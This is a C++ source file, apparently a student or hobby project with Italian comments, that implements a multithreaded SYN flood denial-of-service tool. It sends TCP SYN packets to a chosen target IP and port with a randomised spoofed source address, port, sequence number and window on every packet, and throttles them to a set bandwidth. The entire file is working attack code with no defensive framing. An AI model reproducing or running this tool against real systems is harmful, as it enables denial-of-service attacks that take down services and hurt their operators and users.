//
// Created by stefano on 12/01/21.
//

#include "SynFlood.h"
#include <iostream>
#include <sstream>
#include <thread>
#include <cmath>

uint16_t SynFlood::random_ip_part(){
    return rand() % 253 + 1;
}

void SynFlood::init_random(){
    unsigned seed = time(nullptr);
    srand(seed);
}

IPv4Address SynFlood::random_ip_address(){
    std::stringstream buff;
    buff << random_ip_part() << '.' << random_ip_part() << '.' << random_ip_part() << '.' << random_ip_part();
    return buff.str();
}

void SynFlood::syn_flood(IPv4Address dst_ip, uint16_t dst_port, unsigned counter, double upload_bandwidth) {
    NetworkInterface interface = NetworkInterface::default_interface();
    NetworkInterface::Info info = interface.addresses();
    PacketSender sender;
    init_random();

    IP ip = IP(dst_ip, random_ip_address()) / TCP(dst_port, rand() % 65535);

    TCP *tcp = ip.find_pdu<TCP>();
    tcp->set_flag(TCP::SYN, 1);
    EthernetII eth = EthernetII()/ip;
    std::chrono::duration<double> time_per_1000_packets((300*eth.size()*8 / (upload_bandwidth*pow(10,6))));

    for(int i=0; i<counter/300; i++){
        auto start = std::chrono::steady_clock::now();
        for(int j=0; j<300; j++) {
            // per ogni syn inviato cambio l'indirizzo ip sorgente e id
            ip.src_addr(random_ip_address());
            ip.id(rand() % 65536);

            // per ogni syn inviato cambio scelgo un numero random
            // per la grandezza della finestra di trasmissione e
            // la porta in uscita
            tcp->window(1000 + rand() % 65535);
            tcp->sport(rand() % 65535);
            tcp->seq((rand() % 65536) * (rand() % 65536));

            // mando il pacchetto
            sender.send(ip, interface);
        }
        std::this_thread::sleep_until(start + time_per_1000_packets);
    }
}

void SynFlood::run(){
    NetworkInterface interface = NetworkInterface::default_interface();
    std::cout << "Interface: " << interface.name() << std::endl;
    std::cout << "Threads: " << threads_number << std::endl;

    std::vector<std::thread> threads;
    auto start = std::chrono::steady_clock::now();
    threads.reserve(threads_number);
    for(int i=0; i<threads_number; i++){
        threads.emplace_back(syn_flood,
                             dst_ip, dst_port,
                             (int)(counter/threads_number),
                             (double)upload_bandwidth/threads_number);
    }
    for(std::thread &t: threads){
        t.join();
    }
    auto end = std::chrono::steady_clock::now();
    std::chrono::duration<double> elapsed_seconds = end-start;
    std::cout << "elapsed time: " << elapsed_seconds.count() << std::endl;
    std::cout << "pps: " << counter/elapsed_seconds.count() << " pps" << std::endl;
}

// 60 => size of syn packet
// 2^20 => convert MB to bytes
SynFlood::SynFlood(const IPv4Address &dstIp, const uint16_t dstPort,
                   const unsigned int upload_size, const unsigned int threads_number,
                   const unsigned int upload_bandwidth) : dst_ip(dstIp),
                                                          dst_port(dstPort),
                                                          counter((unsigned )(upload_size*pow(2, 20)/60)),
                                                          threads_number(threads_number),
                                                          upload_bandwidth(upload_bandwidth) {}
